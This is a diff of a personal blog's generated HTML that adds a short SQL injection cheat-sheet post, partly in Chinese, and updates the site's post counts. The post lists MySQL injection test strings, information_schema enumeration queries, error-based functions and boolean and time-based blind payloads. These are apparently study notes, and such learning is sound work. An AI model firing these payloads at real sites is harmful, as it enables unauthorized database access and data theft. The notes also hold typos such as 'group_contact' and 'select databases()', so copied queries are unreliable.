@@ -249,6 +249,160 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/05/Sql-Injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="fxven">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Fxven Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/05/Sql-Injection/" itemprop="url">Sql Injection</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-05T13:20:34+08:00">
+                2018-11-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h2><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><p> <code>GET、POST、Headers</code>   </p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p> <code>&#39;</code>  <code>&quot;</code>   <code>or 1=1</code>  <code>and 1=2</code>  <code># &gt; % 23</code>  <code>--+</code> </p>
+<h3 id="基本函数"><a href="#基本函数" class="headerlink" title="基本函数"></a>基本函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat()、concat_ws()、group_contact()</span><br></pre></td></tr></table></figure>
+<h3 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a>基本语句</h3><p> databases<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select databases();</span><br></pre></td></tr></table></figure></p>
+<p>tables<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=database();</span><br></pre></td></tr></table></figure></p>
+<p>columns<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name) from information_schema.columns where table_name=table_name;</span><br></pre></td></tr></table></figure></p>
+<p>fields<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select field_name from table_name;</span><br></pre></td></tr></table></figure></p>
+<h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><h3 id="Error-injection"><a href="#Error-injection" class="headerlink" title=" Error-injection "></a><strong> Error-injection </strong></h3><p> 对于 <code>select</code> ……<br> 对于 <code>update、insert</code>     </p>
+<p> <code>floor()+ count()+group by</code><br> <code>exp()</code><br> <code>bigint()</code> (MySQL version &gt;= 5.4.45)<br> <code>updatexml()</code>  (MySQL version &gt;= 5.1.5)<br> <code>extractvalue()</code> (MySQL version &gt;= 5.1.5)</p>
+<h3 id="Blinds"><a href="#Blinds" class="headerlink" title="Blinds"></a><strong>Blinds</strong></h3><p>用的的函数: <code>substr()、ascii()、length()、if()、sleep()</code> </p>
+<h4 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h4><p>二分法</p>
+<h4 id="Booleanbase"><a href="#Booleanbase" class="headerlink" title="Booleanbase"></a><strong>Booleanbase</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or substr((select group_concat(fileds) from table_name limit 0,1),1,1)&gt;&apos;a&apos;</span><br></pre></td></tr></table></figure>
+<h4 id="Timebase"><a href="#Timebase" class="headerlink" title="Timebase"></a><strong>Timebase</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or if(substr((select group_concat(fileds) from table_name limit 0,1),1,1)&gt;&apos;a&apos;,sleep(5),1)</span><br></pre></td></tr></table></figure>
+<h4 id="DNSLOG"><a href="#DNSLOG" class="headerlink" title="DNSLOG"></a>DNSLOG</h4>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/26/Hello-world-0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -551,7 +705,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -562,7 +716,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-count">2</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
